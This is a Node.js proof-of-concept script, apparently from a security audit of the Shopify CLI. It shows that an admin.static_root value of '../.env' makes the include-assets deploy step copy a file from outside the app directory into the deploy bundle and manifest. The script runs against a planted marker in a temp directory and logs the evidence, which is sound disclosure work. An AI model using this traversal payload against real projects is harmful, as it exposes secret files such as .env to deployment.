#!/usr/bin/env node
import {register} from 'node:module'
import {fileURLToPath, pathToFileURL} from 'node:url'
import fs from 'node:fs/promises'
import {existsSync} from 'node:fs'
import path from 'node:path'
import os from 'node:os'
import {spawnSync} from 'node:child_process'

const findingDir = path.dirname(fileURLToPath(import.meta.url))
const repoRoot = path.resolve(findingDir, '../../..')
const evidenceDir = path.join(findingDir, 'evidence')

function json(status, evidence, notes = '') {
  console.log(JSON.stringify({status, evidence, notes}))
}

async function ensureCliKitBuild() {
  await fs.mkdir(evidenceDir, {recursive: true})
  const required = path.join(repoRoot, 'packages/cli-kit/dist/public/node/path.js')
  if (existsSync(required)) {
    await fs.writeFile(path.join(evidenceDir, 'poc-setup.log'), `cli-kit dist already present: ${required}\n`)
    return
  }

  const result = spawnSync('pnpm', ['nx', 'build', 'cli-kit', '--skip-nx-cache'], {
    cwd: repoRoot,
    env: {...process.env, NX_DAEMON: 'false'},
    encoding: 'utf8',
  })
  await fs.writeFile(
    path.join(evidenceDir, 'poc-setup.log'),
    `$ pnpm nx build cli-kit --skip-nx-cache\nexit=${result.status}\n\nSTDOUT:\n${result.stdout}\n\nSTDERR:\n${result.stderr}\n`,
  )
  if (result.status !== 0 || !existsSync(required)) {
    throw new Error(`unable to build @shopify/cli-kit prerequisite; see ${path.join(evidenceDir, 'poc-setup.log')}`)
  }
}

async function main() {
  await ensureCliKitBuild()

  process.env.TS_NODE_PROJECT = path.join(repoRoot, 'packages/app/tsconfig.json')
  process.env.TS_NODE_TRANSPILE_ONLY = 'true'
  register('ts-node/esm', pathToFileURL(`${repoRoot}/`))

  const [{executeStep}, {default: adminSpec}, {ExtensionInstance}] = await Promise.all([
    import(pathToFileURL(path.join(repoRoot, 'packages/app/src/cli/services/build/client-steps.ts')).href),
    import(pathToFileURL(path.join(repoRoot, 'packages/app/src/cli/models/extensions/specifications/admin.ts')).href),
    import(pathToFileURL(path.join(repoRoot, 'packages/app/src/cli/models/extensions/extension-instance.ts')).href),
  ])

  const traversal = '../.env'
  const parsed = adminSpec.parseConfigurationObject({admin: {static_root: traversal}})
  if (parsed.state !== 'ok') throw new Error(`admin schema rejected traversal payload: ${JSON.stringify(parsed.errors)}`)

  const deployGroup = adminSpec.clientSteps?.find((group) => group.lifecycle === 'deploy')
  const includeAssetsStep = deployGroup?.steps.find((step) => step.id === 'hosted_app_copy_files')
  if (!includeAssetsStep) throw new Error('admin deploy include_assets step not found')

  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'piolium-include-assets-'))
  const appDir = path.join(tmp, 'malicious-app')
  const outputDir = path.join(tmp, 'deploy-bundle')
  await fs.mkdir(appDir, {recursive: true})
  await fs.mkdir(outputDir, {recursive: true})
  const configurationPath = path.join(appDir, 'shopify.app.toml')
  await fs.writeFile(configurationPath, `[admin]\nstatic_root = ${JSON.stringify(traversal)}\n`)

  const marker = `PIOLIUM_INCLUDE_ASSETS_SECRET_${Date.now()}_${Math.random().toString(16).slice(2)}`
  const outsideFile = path.join(tmp, '.env')
  await fs.writeFile(outsideFile, `LOCAL_SECRET_MARKER=${marker}\n`)

  const capturedStdout = []
  const stdout = {write: (chunk) => capturedStdout.push(String(chunk))}
  const extension = new ExtensionInstance({
    configuration: parsed.data,
    configurationPath,
    directory: appDir,
    specification: adminSpec,
  })
  extension.outputPath = path.join(outputDir, 'admin.js')

  const context = {
    extension,
    options: {stdout, stderr: stdout, app: {}, environment: 'production'},
    stepResults: new Map(),
  }

  const stepResult = await executeStep(includeAssetsStep, context)
  const filesCopied = stepResult.output?.filesCopied ?? 0
  const copiedPath = path.join(outputDir, '.env')
  const manifestPath = path.join(outputDir, 'manifest.json')
  const copiedBody = await fs.readFile(copiedPath, 'utf8')
  const manifestBody = await fs.readFile(manifestPath, 'utf8')
  const manifest = JSON.parse(manifestBody)

  const confirmed = copiedBody.includes(marker) && manifest.static_root === '.env' && stepResult.success === true && filesCopied === 1
  const healthcheck = [
    `node=${process.version}`,
    `platform=${os.platform()} ${os.release()} ${os.arch()}`,
    `repoRoot=${repoRoot}`,
    `adminSpecParseState=${parsed.state}`,
    `includeAssetsStep=${includeAssetsStep.id}`,
    `executeStepSuccess=${stepResult.success}`,
    `configurationPath=${configurationPath}`,
    `traversalPayload=${traversal}`,
    `outsideFile=${outsideFile}`,
    `appDirectory=${appDir}`,
    `outsideFileEscapesAppDirectory=${!outsideFile.startsWith(`${appDir}${path.sep}`)}`, 
    `outputDir=${outputDir}`,
    `confirmed=${confirmed}`,
  ].join('\n')
  await fs.writeFile(path.join(evidenceDir, 'healthcheck.log'), `${healthcheck}\n`)

  const impact = [
    'Actual application code exercised:',
    '  packages/app/src/cli/models/extensions/specifications/admin.ts clientSteps[deploy].hosted_app_copy_files',
    '  packages/app/src/cli/models/extensions/extension-instance.ts ExtensionInstance',
    '  packages/app/src/cli/services/build/client-steps.ts executeStep() router',
    '  packages/app/src/cli/services/build/steps/include-assets-step.ts executeIncludeAssetsStep()',
    '  packages/app/src/cli/services/build/steps/include-assets/copy-config-key-entry.ts copyConfigKeyEntry()',
    '',
    `Attacker-controlled config: admin.static_root = ${JSON.stringify(traversal)}`,
    `App/config module root: ${appDir}`,
    `Outside source file: ${outsideFile}`,
    `Copied bundle file: ${copiedPath}`,
    `Manifest path: ${manifestPath}`,
    '',
    `executeStep success: ${stepResult.success}`,
    `filesCopied: ${filesCopied}`,
    `CLI include-assets log: ${capturedStdout.join('').trim()}`,
    `Copied file contents: ${copiedBody.trim()}`,
    `Manifest contents: ${manifestBody.trim()}`,
    '',
    confirmed
      ? 'CONFIRMED: the marker from a file outside the app/config module directory was copied into the deploy bundle and manifest.'
      : 'FAILED: marker/manifest checks did not match.',
  ].join('\n')
  await fs.writeFile(path.join(evidenceDir, 'impact.log'), `${impact}\n`)

  console.log(`Copied outside file into bundle: ${copiedPath}`)
  console.log(`Manifest static_root: ${manifest.static_root}`)
  if (confirmed) {
    json('confirmed', 'outside .env marker copied to include-assets deploy bundle and manifest', `impact log: ${path.relative(repoRoot, path.join(evidenceDir, 'impact.log'))}`)
  } else {
    json('failed', 'outside file was not copied into the deploy bundle', `impact log: ${path.relative(repoRoot, path.join(evidenceDir, 'impact.log'))}`)
    process.exitCode = 1
  }
}

main().catch(async (error) => {
  await fs.mkdir(evidenceDir, {recursive: true}).catch(() => {})
  await fs.writeFile(path.join(evidenceDir, 'impact.log'), `PoC failed before confirmation:\n${error.stack ?? error.message}\n`).catch(() => {})
  json('inconclusive', 'PoC setup or execution error', String(error.message ?? error))
  process.exitCode = 1
})
